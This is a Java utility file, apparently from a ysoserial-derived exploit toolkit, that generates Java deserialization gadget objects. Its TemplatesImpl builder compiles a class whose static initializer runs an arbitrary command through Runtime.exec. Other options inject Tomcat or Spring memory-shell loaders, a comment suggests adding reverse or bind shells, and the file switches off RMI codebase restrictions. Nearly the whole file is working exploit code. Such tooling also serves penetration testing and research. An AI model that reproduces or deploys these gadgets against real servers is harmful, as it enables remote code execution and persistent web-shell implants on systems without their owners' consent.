package org.erosion2020.util;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import java.io.Serializable;
import java.lang.reflect.*;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Map;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings ( {
    "restriction", "rawtypes", "unchecked"
} )
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}


        @Override
        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        CommandCursor cursor = new CommandCursor(command);
        String loader = cursor.next();
        final CtClass clazz;
        switch (loader) {
            case "tomcat-loader":
                clazz = pool.get(org.erosion2020.memshell.classloader.TemplatesImplTomcat.class.getName());
                clazz.makeClassInitializer().insertBefore(
                        "loader_pram = \""+cursor.next()+"\";"
                );
                break;
            case "spring-loader":
                clazz = pool.get(org.erosion2020.memshell.classloader.TemplatesImplSpring.class.getName());
                clazz.makeClassInitializer().insertBefore(
                        "loader_pram = \""+cursor.next()+"\";"
                );
                break;
            default:
                pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
                pool.insertClassPath(new ClassClassPath(abstTranslet));
                clazz = pool.get(Gadgets.StubTransletPayload.class.getName());
                // run command in static initializer
                // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
                String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                        command.replace("\\", "\\\\").replace("\"", "\\\"") +
                        "\");";
                clazz.makeClassInitializer().insertAfter(cmd);
                // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
                clazz.setName("ysoserial.Pwner" + System.nanoTime());
                CtClass superC = pool.get(abstTranslet.getName());
                clazz.setSuperclass(superC);
                break;
        }
        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr_" + System.nanoTime());
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static String md5(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));
            // 转为32位十六进制字符串
            StringBuilder hexString = new StringBuilder();
            for (byte b : digest) {
                String hex = Integer.toHexString(0xff & b);
                if (hex.length() == 1) hexString.append('0');
                hexString.append(hex);
            }
            // 取前16位
            return hexString.toString();
        } catch (Exception e) {
            throw new RuntimeException("MD5 calculation failed", e);
        }
    }
}
